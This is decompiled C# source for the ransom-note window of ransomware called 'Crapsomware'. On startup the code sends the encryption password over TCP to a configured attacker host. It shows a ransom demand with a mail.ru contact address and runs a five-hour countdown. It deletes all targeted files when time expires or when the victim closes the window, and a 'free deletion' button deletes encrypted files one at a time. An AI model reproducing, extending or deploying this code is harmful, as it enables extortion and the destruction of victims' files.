using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Crapsomware;

public class Form1 : Form
{
	public bool allowClose = false;

	public int time = 18000;

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private TextBox textBox2;

	private Button button1;

	private Label label4;

	private ListBox listBox1;

	private Button button2;

	private Label label5;

	private Label label6;

	private Timer timer1;

	public Form1()
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(Program.password);
			TcpClient tcpClient = new TcpClient(Settings.host, Settings.port);
			tcpClient.GetStream().Write(bytes, 0, bytes.Length);
			tcpClient.Close();
		}
		catch
		{
		}
		InitializeComponent();
		((Control)textBox1).set_Text(Program.password);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		foreach (string item in Program.Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + Program.ext)
			{
				listBox1.get_Items().Add((object)item.Substring(0, item.Length - (Program.ext.Length + 1)));
			}
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		if (allowClose)
		{
			return;
		}
		DialogResult val = MessageBox.Show("are you suuuuuure want to do this?", "are you suuuuuuuuuure?", (MessageBoxButtons)4, (MessageBoxIcon)32);
		if ((int)val == 6)
		{
			allowClose = true;
			((Form)this).Close();
			Program.password = "";
			((Control)textBox1).set_Text("Key is destroyed!");
			new Thread((ThreadStart)delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Key is destroyed! Have fun exploring your corrupted files :)", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}).Start();
			{
				foreach (string item in Program.Files())
				{
					if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory))
					{
						File.Delete(item);
					}
				}
				return;
			}
		}
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		((Control)button1).set_Enabled(false);
		((TextBoxBase)textBox2).set_ReadOnly(true);
		byte[] array = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(((Control)textBox2).get_Text()));
		bool flag = false;
		if (array.Length == Program.hash.Length)
		{
			int i;
			for (i = 0; i < array.Length && array[i] == Program.hash[i]; i++)
			{
			}
			if (i == array.Length)
			{
				flag = true;
			}
		}
		if (flag)
		{
			new Thread((ThreadStart)delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show("Valid key! Decrypting files...", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}).Start();
			Program.password = ((Control)textBox2).get_Text();
			allowClose = true;
			((Form)this).Close();
			Program.Decrypt();
		}
		else
		{
			MessageBox.Show("Invalid key! Please try again", "", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)button1).set_Enabled(true);
			((TextBoxBase)textBox2).set_ReadOnly(false);
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)button2).get_Text() == "Free decryption")
		{
			((Control)button2).set_Text("Free deletion");
			return;
		}
		foreach (string item in Program.Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + Program.ext)
			{
				File.Delete(item);
				listBox1.get_Items().Remove((object)item.Substring(0, item.Length - (Program.ext.Length + 1)));
				Program.Files().Remove(item);
				MessageBox.Show("File " + Path.GetFileName(item.Substring(0, item.Length - (Program.ext.Length + 1))) + " deleted!", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
				break;
			}
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		time--;
		((Control)label6).set_Text(TimeSpan.FromSeconds(time).ToString("h\\:mm\\:ss"));
		if (time != 0)
		{
			return;
		}
		timer1.Stop();
		timer1.set_Enabled(false);
		allowClose = true;
		((Form)this).Close();
		Program.password = "";
		((Control)textBox1).set_Text("Key is destroyed!");
		new Thread((ThreadStart)delegate
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show("Time is over, key is destroyed! Have fun exploring your corrupted files :)", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}).Start();
		foreach (string item in Program.Files())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory))
			{
				File.Delete(item);
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		//IL_01c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d0: Expected O, but got Unknown
		//IL_0379: Unknown result type (might be due to invalid IL or missing references)
		//IL_0383: Expected O, but got Unknown
		//IL_04e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f2: Expected O, but got Unknown
		//IL_056d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0577: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		button1 = new Button();
		label4 = new Label();
		listBox1 = new ListBox();
		button2 = new Button();
		label5 = new Label();
		label6 = new Label();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_Location(new Point(322, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(94, 25));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oh crap!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_Location(new Point(12, 43));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(416, 96));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Your files got encypted by Crapsomware.\r\nYou can't decrypt your files without a special key.\r\nMail your personal id to Kto.Nado.1999@mail.ru\r\nYour personal id:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_Location(new Point(12, 391));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(307, 24));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Enter your personal decryption key:");
		((Control)textBox1).set_Location(new Point(16, 142));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(772, 246));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox2).set_Location(new Point(16, 418));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(691, 20));
		((Control)textBox2).set_TabIndex(4);
		((Control)button1).set_Location(new Point(713, 416));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("Decrypt!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_Location(new Point(540, 9));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(138, 24));
		((Control)label4).set_TabIndex(6);
		((Control)label4).set_Text("Encrypted files:");
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_HorizontalScrollbar(true);
		((Control)listBox1).set_Location(new Point(434, 41));
		((Control)listBox1).set_Name("listBox1");
		listBox1.set_SelectionMode((SelectionMode)0);
		((Control)listBox1).set_Size(new Size(354, 95));
		((Control)listBox1).set_TabIndex(7);
		((Control)button2).set_Location(new Point(16, 444));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(119, 23));
		((Control)button2).set_TabIndex(8);
		((Control)button2).set_Text("Free decryption");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label5).set_Location(new Point(809, 10));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(86, 24));
		((Control)label5).set_TabIndex(9);
		((Control)label5).set_Text("Time left:");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label6).set_Location(new Point(794, 41));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(125, 37));
		((Control)label6).set_TabIndex(10);
		((Control)label6).set_Text("5:00:00");
		timer1.set_Enabled(true);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(935, 476));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Crapsomware note");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
